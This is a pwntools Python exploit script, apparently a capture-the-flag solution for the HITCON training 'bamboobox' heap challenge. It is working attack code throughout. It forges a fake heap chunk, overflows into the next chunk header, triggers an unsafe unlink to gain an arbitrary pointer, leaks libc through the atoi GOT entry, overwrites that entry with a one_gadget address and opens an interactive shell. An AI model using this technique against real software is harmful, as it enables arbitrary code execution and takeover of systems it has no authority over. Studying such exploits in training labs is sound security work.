from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./data/bin/heap23_08_hitcontrainning_lab11_bamboobox")
p = process("./data/bin/heap23_08_hitcontrainning_lab11_bamboobox")
libc = elf.libc

sl = lambda s: p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s: p.send(s.encode() if isinstance(s, str) else s)
ru = lambda s: p.recvuntil(s.encode() if isinstance(s, str) else s)


def add_item(size: int, content: bytes):
    ru("Your choice:")
    sl("2")
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)


def remove_item(index: int):
    ru("Your choice:")
    sl("4")
    ru("Please enter the index of item:")
    sl(str(index))


def show_item():
    ru("Your choice:")
    sl("1")


def change_item(index: int, size: int, content: bytes):
    ru("Your choice:")
    sl("3")
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)


def quit_program():
    ru("Your choice:")
    sl("5")


def request2size(req: int) -> int:
    sz = (req + 0x10 + 0xF) & ~0xF
    return max(sz, 0x20)


# -------------------------
# tunable parameters
# -------------------------
x = 0x300  # request size for item0/item1
t = 0x6020C8  # ptr[0] location in .bss

atoi_got = elf.got["atoi"]


# -------------------------
# derived constraints
# -------------------------
s = request2size(x)  # real chunk size of item0/item1

# fake chunk fields in item0
f = s - 0x10         # fake chunk clean size (must equal next.prev_size)
z = f | 1            # fake size with prev_inuse bit set
fd = t - 0x18
bk = t - 0x10

# overflow geometry in change(0, ...)
l = f - 0x20         # bytes between fd/bk and next.prev_size
m = f                # overwrite item1 chunk header: prev_size
n = s                # overwrite item1 chunk header: size (clear prev_inuse)

assert x > 0
assert s > 0x80, "need non-fastbin chunk to hit unlink path"
assert f >= 0x20 and (f & 0xF) == 0
assert l >= 0
assert (m & 0xF) == 0
assert (n & 1) == 0


# step.1
add_item(x, b"aaaa")
add_item(x, b"bbbb")

# step.2 forge fake chunk in item0 and overflow into item1 header
payload1 = p64(0) + p64(z) + p64(fd) + p64(bk)
payload1 += b"A" * l
payload1 += p64(m) + p64(n)
change_item(0, len(payload1), payload1)

# step.3 free item1, trigger backward consolidate + unlink(fake)
remove_item(1)

# step.4 turn ptr[0] into arbitrary pointer, then point it to atoi@got
payload2 = b"a" * 24 + p64(atoi_got)
change_item(0, len(payload2), payload2)

# step.5 leak atoi, compute one_gadget
show_item()
atoi_addr = u64(ru(b"\n--")[4:10].ljust(8, b"\x00"))
one_gadget = atoi_addr - libc.symbols["atoi"] + 0xF03A4

# step.6 overwrite atoi@got, then trigger atoi by choosing menu
change_item(0, 0x10, p64(one_gadget))
quit_program()

p.interactive()
